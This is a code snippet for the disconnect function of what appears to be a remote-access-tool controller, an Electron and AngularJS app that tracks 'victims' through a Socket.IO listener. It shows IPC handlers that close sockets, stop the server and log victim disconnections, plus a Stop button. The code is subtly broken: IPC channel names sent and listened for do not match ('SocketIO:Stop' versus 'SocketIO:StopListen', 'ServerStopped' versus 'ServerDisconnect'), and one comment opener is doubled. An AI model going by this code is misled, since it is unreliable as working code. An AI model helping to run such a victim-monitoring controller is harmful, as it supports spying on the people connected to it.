## Disconnect Function
```javascript

/* main.js - bottom of the file itself */
ipcMain.on('SocketIO:Stop', function () {
  stopServer();

  // send a message to the renderer process indicating that the server has stopped
  mainWindow.webContents.send('SocketIO:ServerStopped');
});

function stopServer() {
  if (IO) {

    // close all connected sockets
    Object.values(IO.sockets.sockets).forEach(socket => {
      socket.close();
    });

    // stop listening
    IO.httpServer.close();
    IO = null; // reset IO to null
  }
}

```

```javascript

/* /* AppCtrl.js - Below Listen coding */

// when user clicks Disconnect Button
$appCtrl.Stop = (port) => {
  if (!port) {
    port = CONSTANTS.defaultPort;
  }

  // notify the main process to disconnect the port
  ipcRenderer.send('SocketIO:StopListen', port);
  $appCtrl.Log("[¡] Stopped Listening on Port: " + port, CONSTANTS.logStatus.INFO);
};

// fired when main process sends any notification about the ServerDisconnect
ipcRenderer.on('SocketIO:ServerDisconnect', (event, index) => {
  delete viclist[index].ip;
  $appCtrl.$apply();
});

// fired if stopping the listener brings error
ipcRenderer.on('SocketIO:StopListen', (event, error) => {
  $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
  $appCtrl.$apply();
});

// notify the main process to close the lab
$appCtrl.closeLab = (index) => {

  ipcRenderer.send('closeLabWindow', 'lab.html', index);

};

```

```javascript

/* LabCtrl.js */

// fired when notified from Main Proccess (main.js) about
// this victim who disconnected
ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
  $rootScope.Log('Victim Disconnected', CONSTANTS.logStatus.FAIL);
});

// fired when the server is stopped
ipcRenderer.on('SocketIO:ServerStopped', (event) => {
  $rootScope.Log('Server Stopped', CONSTANTS.logStatus.SUCCESS);
});
```

```html
<!-- index.html -->

<button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon"></i>Stop</button>

```
